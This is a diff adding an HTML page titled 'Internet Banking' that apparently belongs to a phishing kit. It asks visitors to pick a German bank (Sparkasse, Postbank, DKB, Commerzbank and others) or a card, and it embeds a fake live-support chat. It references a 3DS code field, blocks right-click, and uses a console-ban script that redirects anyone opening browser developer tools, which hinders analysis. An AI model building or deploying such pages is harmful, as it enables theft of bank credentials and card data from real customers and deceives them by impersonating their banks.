@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="pl">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<link href="https://iconarchive.com/download/i86029/graphicloads/100-flat-2/bank.ico" rel="icon" type="image/x-icon">
+		<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+		<!-- support -->
+		<link rel="stylesheet" href="/static/style/support/support_parent.css">
+		<script src="/static/style/protect/protect.js"></script>
+		<title>Internet Banking</title>
+		<style>
+			._0 {
+				margin: 0 auto;
+				width: 658px;
+				box-sizing: border-box;
+				background: #fff;
+				margin-top: 50px;
+				margin-bottom: 50px;
+			}
+			._1 {
+				font-size: 18px;
+				padding-top: 16px;
+				/*width: 200px;*/
+			}
+			._2 {
+				margin: 10px 0;
+				border-bottom: 1px solid #ddd;
+			}
+			._3 {
+				text-align: left;
+			    font-size: 14px;
+			    border-radius: 6px;
+			    padding: 16px 10px;
+			    margin-bottom: 10px;
+			    background: #f6f6f6;
+				border-bottom: 2px solid #68777d;
+			}
+			._3:focus {
+				outline: none;
+			}
+			._3mob {
+				text-align: left;
+			    font-size: 14px;
+			    /*border-radius: 6px;*/
+			    padding: 12px 10px;
+			    margin-bottom: 20px;
+			    /*background: #f6f6f6;*/
+				/*border-bottom: 2px solid #68777d;*/
+				border: 1px solid #d4d4d4;
+			}
+			._3mob:focus {
+				outline: none;
+			}
+			._4 {
+				float: right;
+			    width: 100%;
+				margin: 0;
+			    color: #000;
+			    font-weight: 400;
+			    font-size: 17px;
+			    line-height: 24px;
+			    display: inline-block;
+			    -webkit-box-sizing: border-box;
+			    box-sizing: border-box;
+			    padding: 8px 30px 6px 31px;
+			    min-width: 180px;
+			    border-radius: 3px;
+			    white-space: nowrap;
+			    background-color: #007eae;
+			    color: #fff;
+			    text-align: center;
+			    text-decoration: none;
+			    margin-top: 10px;
+			}
+			._4:hover {
+				background-color: #015879;
+			    color: #fff;
+			    border-color: #015879;
+			}
+			._5 {
+				color: #aaa;
+				text-align: right;
+				width: 45%;
+				padding-right: 24px;
+			}
+			._6 {
+				font-weight: bold;
+			}
+			._7 {
+				margin-top: 4px;
+				margin-bottom: 16px;
+			}
+			._8 {
+				padding-bottom: 6px;
+				line-height: 18px;
+			}
+			._9 {
+				text-align: right;
+			}
+			body {
+				margin: 0;
+				font-family: Arial;
+				font-size: 12px;
+				color: #222;
+				word-break: break-word;
+				user-select: none;
+				background: #fdfdfd;
+			}
+			input {
+				font-family: Arial;
+				font-size: 12px;
+				color: #222;
+				width: 100%;
+				border: none;
+				box-sizing: border-box;
+				text-align: center;
+			}
+			table {
+				width: 100%;
+				border-collapse: separate;
+				border-spacing: 0;
+			}
+			td {
+				padding: 4px 0;
+			}
+			#mainblock {
+				display: flex;
+				margin: 0 20px;
+			    /*border-bottom: 1px solid #e4e4e4;*/
+			}
+			#rightblock {
+				margin-top: 100px;
+				display: flex;
+			}
+			.loginboxes {
+				display: flex;
+			}
+			#formblock {
+                /*border-right: 1px solid #e4e4e4;
+                padding-right: 70px; */
+                padding-bottom: 20px; 
+                margin-top: 20px;
+			}
+			#konto {
+				margin-left: 20%; 
+				padding-top: 30px;
+			}
+			#Pomoc {
+				display: none;
+                padding-top: 25px; 
+                width: 150px;
+			}
+			.footer-menu {
+				text-decoration: none;
+				padding: 10px;
+				color: #667;
+				font-size: 13px;
+			}
+			.footer-menu-mob {
+				text-decoration: none;
+				padding: 10px;
+				color: #555;
+				font-size: 16px;
+			}
+			._0mob {
+				display: none;
+			}
+			.footermenumob {
+				padding: 20px;
+				border-bottom: 1px solid #d4d4d4;
+			}
+			.bankbutton {
+				border: none;
+			    background: none;
+			    width: 100%;
+			    border-top: none;
+			    padding: 10px;
+			    background: #fff;
+			    border: 1px solid #dcdcdc;
+			}
+			#main2 {
+				border: 1px solid #dcdcdc;
+				display: block;
+				padding: 20px;
+				background: #f3f3f3;
+			}
+			.sub-block {
+				display: flex;
+			}
+			.sub-block1 {
+				display: flex;
+				margin: 10px 0;
+			}
+			.bankbank {
+				margin: 0 10px;
+			}
+			@media all and (max-width: 800px) {
+				/*#mainblock {
+					display: block;
+				}
+				#formblock {
+					border-right: none;
+					padding-right: 0; 
+				}*/
+				#main2 {
+					display: block;
+				}
+				.sub-block1 {
+					display: block;
+					margin: 0;
+				}
+				.sub-block {
+					margin-bottom: 10px;
+				}
+				._0 {
+					width: 353px;
+				}
+				#visablock {
+					width: 155px;
+				    margin: 0 auto;
+				}
+			}
+			@media all and (max-width: 500px) {
+				.loginboxes {
+					display: block;
+				}
+				#rightblock {
+					display: block;
+				}
+				.sub-block {
+					display: block;
+					margin-bottom: 0;
+				}
+				.bankbutton {
+                    margin-bottom: 10px;
+				}
+				#visablock {
+					width: 100%;
+				}
+			}
+		</style>
+		</head>
+		<body>
+			<div class="
+        chatra--webkit
+        chatra--style-round
+        chatra--side-bottom
+        chatra--pos-right
+        chatra--visible
+        chatra--expanded
+        chatra--fast-toggle
+      " id="chatra" data-turbolinks-permanent="" style="width: 380px; height: 600px; transform: none; z-index: 2147483647; display:none;">
+    <div id="chatra__iframe-wrapper">
+      <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay" src="/static/style/support/index.html?id=<%=id %>" style="width: 380px; height: 600px; position: absolute"></iframe>
+    </div>
+  </div>
+  <div class="support-circle" onclick="document.querySelector(&#39;#chatra&#39;).style.display = &#39;block&#39;;this.style.display = &#39;none&#39;"></div>
+			<div id="mainblock">
+				<div class="_0">
+					<div>
+						<div style="text-align: center; color: #555; font-size: 27px; margin: 50px 0; padding: 10px 0; background: #defaff; border-bottom: 1px solid #cadaea;">Wählen Sie Ihre Bank aus, um fortzufahren</div>
+					</div>
+					<div id="main2">
+						<div class="sub-block1">
+							<div class="sub-block">
+								<form class="bankbank" id="bankbank1" method="post">
+									<input type="text" value="PostBank" name="bankname" style="display: none;">
+									<button form="bankbank1" type="submit" class="bankbutton"><img src="/static/style/de_logos/postbank.jpg" height="60"></button>
+								</form>
+								<form class="bankbank" id="bankbank2" method="post">
+									<input type="text" value="Sparkasse" name="bankname" style="display: none;">
+									<button form="bankbank2" type="submit" class="bankbutton"><img src="/static/style/de_logos/sparkasse.jpg" height="60"></button>
+								</form>
+							</div>
+							<div class="sub-block">
+								<form class="bankbank" id="bankbank3" method="post">
+									<input type="text" value="Bank Comdirect" name="bankname" style="display: none;">
+									<button form="bankbank3" type="submit" class="bankbutton"><img src="/static/style/de_logos/comdirect.webp" height="60"></button>
+								</form>
+								<form class="bankbank" id="bankbank4" method="post">
+									<input type="text" value="DKB Bank" name="bankname" style="display: none;">
+									<button form="bankbank4" type="submit" class="bankbutton"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGlkPSJFYmVuZV8xIiB2aWV3Qm94PSItMTA0LjUgMzE2LjUgMjgzLjQgMTYwLjYiPjxzdHlsZSBpZD0ic3R5bGUzIj4uc3Qwe2ZpbGw6IzE0OGRlYX08L3N0eWxlPjxnIGlkPSJMb2dvIj48ZyBpZD0iZzYiPjxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0tMTA0LjUgMzE2LjVoNDEuMmMyMy42IDAgNTEuNiAxNy43IDUxLjYgNTMgMCAzMi40LTI4IDUzLTUxLjYgNTNoLTQxLjJ2LTEwNnptNjMuMyA1M2MwLTIyLjEtMTcuNy0yNi41LTMzLjktMjYuNXY1M2MxNi4yIDAgMzMuOS00LjQgMzMuOS0yNi41eiIgaWQ9InBhdGg4Ii8+PHBhdGggY2xhc3M9InN0MCIgZD0iTS0uMSAzMTYuNWgyOS41djM5LjhoLjNMNTMgMzE2LjVoMzMuOUw1NiAzNjUuMWwzMy45IDU3LjVINTZsLTI2LjItNDUuN2gtLjN2NDUuN0gwVjMxNi41aC0uMXoiIGlkPSJwYXRoMTAiLz48cGF0aCBjbGFzcz0ic3QwIiBkPSJNOTcuOSAzMTYuNWg0Mi43YzE5LjIgMCAzMi40IDExLjUgMzIuNCAyNi41IDAgMTAtMy41IDE4LjYtMTEuNSAyMS4xdi4zYzYuNiAyLjUgMTcuNCAxMS41IDE3LjQgMjUuOCAwIDIxLjItMTYuMiAzMi40LTMzLjkgMzIuNEg5Ny45VjMxNi41em0zOC41IDQyLjRjNSAwIDkuMy0zLjIgOS4zLTkuMyAwLTUuNy00LjMtOS4zLTkuMy05LjNoLTl2MTguNmg5em0yLjYgMzguNGM1LjkgMCA5LjMtNC43IDkuMy0xMC42IDAtNS45LTQuNy0xMC42LTEwLjYtMTAuNmgtMTAuM3YyMS4ySDEzOXoiIGlkPSJwYXRoMTIiLz48L2c+PC9nPjxnIGlkPSJDbGFpbV8yIj48ZyBpZD0iZzE1Ij48cGF0aCBjbGFzcz0ic3QwIiBkPSJNLTk0LjMgNDc2LjRoLTEwLjJ2LTMyLjZoMTBjNy43IDAgMTYuMyA1LjQgMTYuMyAxNi4zIDAgMTAuOC04LjcgMTYuMy0xNi4xIDE2LjN6bS0xLjYtMjdoLTIuNXYyMS4zaDIuNWM1LjQgMCAxMS4zLTMuNCAxMS4zLTEwLjcgMC03LjItNS45LTEwLjYtMTEuMy0xMC42eiIgaWQ9InBhdGgxNyIvPjxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0tNjAuNyA0NzYuNHYtMS44aC0uMWMtMS41IDEuOC0zLjggMi41LTYuNSAyLjUtNC41IDAtOC42LTMuOS04LjYtMTAuMnM0LjEtMTAuMiA4LjYtMTAuMmMyLjcgMCA1IC43IDYuNSAyLjVoLjF2LTEuOGg1Ljd2MTloLTUuN3ptLTQuOC0xNC41Yy0yLjMgMC00LjUgMS44LTQuNSA1czIuMyA1IDQuNSA1YzIuNyAwIDQuOC0xLjggNC44LTVzLTItNS00LjgtNXoiIGlkPSJwYXRoMTkiLz48cGF0aCBjbGFzcz0ic3QwIiBkPSJNLTQ0LjQgNDc3LjFjLTMuMyAwLTUuNi0xLjUtNy4zLTMuMWwyLjQtMy43YzEuMiAxLjIgMy4zIDIuNCA0LjkgMi40IDEuNyAwIDIuNC0uNiAyLjQtMS42IDAtMy4zLTguOS0yLjEtOC45LTkgMC0zLjcgMy4yLTUuNCA2LjgtNS40IDMuMyAwIDUuMy42IDcuMyAyLjJsLTIuNCAzLjNjLTEuMi0uOC0yLjktMS40LTQuNS0xLjQtMSAwLTIgLjItMiAxLjQgMCAyLjQgOS4zIDIgOS4zIDkgLjEgNC42LTMuNSA1LjktOCA1Ljl6IiBpZD0icGF0aDIxIi8+PHBhdGggY2xhc3M9InN0MCIgZD0iTS05LjEgNDc2LjRsLTYtOC4yaC0uMXY4LjJoLTUuN3YtMzMuMWg1Ljd2MjAuOWguMWw1LjEtNi44aDYuOGwtNy4zIDkuMSA4LjIgMTBoLTYuOHYtLjF6IiBpZD0icGF0aDIzIi8+PHBhdGggY2xhc3M9InN0MCIgZD0iTTEzLjIgNDc2LjR2LTEuOGgtLjFjLTEuNSAxLjgtMy44IDIuNS02LjUgMi41LTQuNSAwLTguNi0zLjktOC42LTEwLjJzNC4xLTEwLjIgOC42LTEwLjJjMi43IDAgNSAuNyA2LjUgMi41aC4xdi0xLjhoNS43djE5aC01Ljd6bS00LjgtMTQuNWMtMi4zIDAtNC41IDEuOC00LjUgNXMyLjMgNSA0LjUgNWMyLjcgMCA0LjgtMS44IDQuOC01cy0yLTUtNC44LTV6IiBpZD0icGF0aDI1Ii8+PHBhdGggY2xhc3M9InN0MCIgZD0iTTM2LjYgNDc2LjRWNDY2YzAtMi43LS45LTQuMS0zLjYtNC4xLTIuMyAwLTMuOSAxLjgtMy45IDQuMXYxMC40aC01Ljd2LTE5aDUuN3YxLjhoLjFjMS41LTEuOCAzLjgtMi41IDYuMS0yLjUgNC40IDAgNi45IDIuNSA2LjkgNy41djEyLjJoLTUuNnoiIGlkPSJwYXRoMjciLz48cGF0aCBjbGFzcz0ic3QwIiBkPSJNNjAgNDc2LjRWNDY2YzAtMi43LS45LTQuMS0zLjYtNC4xLTIuMyAwLTMuOSAxLjgtMy45IDQuMXYxMC40aC01Ljd2LTE5aDUuN3YxLjhoLjFjMS41LTEuOCAzLjgtMi41IDYuMS0yLjUgNC40IDAgNi45IDIuNSA2LjkgNy41djEyLjJINjB6IiBpZD0icGF0aDI5Ii8+PHBhdGggY2xhc3M9InN0MCIgZD0iTTkzIDQ3Ni40SDgyLjF2LTMyLjZoMTBjNS40IDAgMTAgMy4zIDEwIDguMiAwIDMuNi0xLjggNi4zLTQuMSA3LjMgMi4zLjkgNS40IDMuMiA1LjQgNy43LjEgNS44LTQuNSA5LjQtMTAuNCA5LjR6TTkxLjcgNDQ5aC0zLjR2Ny43aDMuNGMyLjMgMCA0LjUtMS4xIDQuNS0zLjkgMC0yLjctMi4yLTMuOC00LjUtMy44em0uNCAxMi45aC0zLjl2OS4xaDMuOWMzLjIgMCA1LTEuOCA1LTQuNSAwLTIuOC0xLjgtNC42LTUtNC42eiIgaWQ9InBhdGgzMSIvPjxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0xMjEuOCA0NzYuNHYtMS44aC0uMWMtMS41IDEuOC0zLjggMi41LTYuNSAyLjUtNC41IDAtOC42LTMuOS04LjYtMTAuMnM0LjEtMTAuMiA4LjYtMTAuMmMyLjcgMCA1IC43IDYuNSAyLjVoLjF2LTEuOGg1Ljd2MTloLTUuN3ptLTQuOC0xNC41Yy0yLjMgMC00LjUgMS44LTQuNSA1czIuMyA1IDQuNSA1YzIuNyAwIDQuOC0xLjggNC44LTVzLTIuMS01LTQuOC01eiIgaWQ9InBhdGgzMyIvPjxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0xNDUuMiA0NzYuNFY0NjZjMC0yLjctLjktNC4xLTMuNi00LjEtMi4zIDAtMy45IDEuOC0zLjkgNC4xdjEwLjRIMTMydi0xOWg1Ljd2MS44aC4xYzEuNS0xLjggMy44LTIuNSA2LjEtMi41IDQuNCAwIDYuOSAyLjUgNi45IDcuNXYxMi4yaC01LjZ6IiBpZD0icGF0aDM1Ii8+PHBhdGggY2xhc3M9InN0MCIgZD0iTTE2Ny4yIDQ3Ni40bC02LTguMmgtLjJ2OC4yaC01Ljd2LTMzLjFoNS43djIwLjloLjFsNS4xLTYuOGg2LjhsLTcuMyA5LjEgOC4yIDEwaC02Ljd2LS4xeiIgaWQ9InBhdGgzNyIvPjwvZz48L2c+PC9zdmc+" height="60"></button>
+								</form>
+							</div>
+						</div>
+
+						<div class="sub-block1">
+							<div class="sub-block">
+								<form class="bankbank" id="bankbank5" method="post">
+									<input type="text" value="Commerzbank" name="bankname" style="display: none;">
+									<button form="bankbank5" type="submit" class="bankbutton"><img src="/static/style/de_logos/commerzbank.png" height="100"></button>
+								</form>
+								<!-- <form class="bankbank" id="bankbank4" method="post">
+									<input type="text" value="DZbank" name="bankname" style="display: none;">
+									<button form="bankbank4" type="submit" class="bankbutton"><img src="/static/style/de_logos/dzbank.png" height="60"></button>
+								</form> -->
+							</div>
+                            <div class="sub-block">
+								<form class="bankbank" id="bankbank6" method="post">
+									<input type="text" value="Other card (VISA/MASTERCARD)" name="bankname" style="display: none;">
+									<button form="bankbank6" type="submit" class="bankbutton"><img src="/static/style/de_logos/other.gif" height="60"></button>
+								</form>
+							</div>
+						</div>
+					</div>
+				</div>
+
+
+
+			<script>
+				let pwdChars = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789aąbсćdеęfghijklłmnńoóprsśtuwyzźżAĄBCĆDEĘFGHIJKLŁMNŃOÓPRSŚTUWYZŹŻ';
+				let pwdLen = 20;
+				function inputMask(elem) {
+					let val = elem.value;
+					let val2 = '';
+					for (let i = 0; i < val.length; i++) {
+						if (pwdChars.includes(val[i]))
+							val2 += val[i];
+					}
+					elem.value = val2.substr(0, pwdLen);
+				}
+				document.addEventListener('DOMContentLoaded', function() {
+					field3ds.oninput = function() {
+						inputMask(field3ds);
+					}
+					field3ds.focus();
+				});
+				document.oncontextmenu = function() {
+					return false;
+				};
+			</script>
+
+			<script type="text/javascript">
+				function openForm() {
+				$('#myForm').css('display', 'block')
+				$('#open-support').css('display', 'none')
+			}
+
+			function closeForm() {
+				$('#myForm').css('display', 'none')
+				$('#open-support').css('display', 'block')
+
+			}
+			</script>
+			<script src="https://cdn.jsdelivr.net/gh/fz6m/console-ban@3.2/dist/console-ban.min.js"></script>
+			<script>
+				ConsoleBan.init({
+					redirect: 'https://http.cat/403'
+				})
+			</script>
+		</div>
+	</body>
+</html>
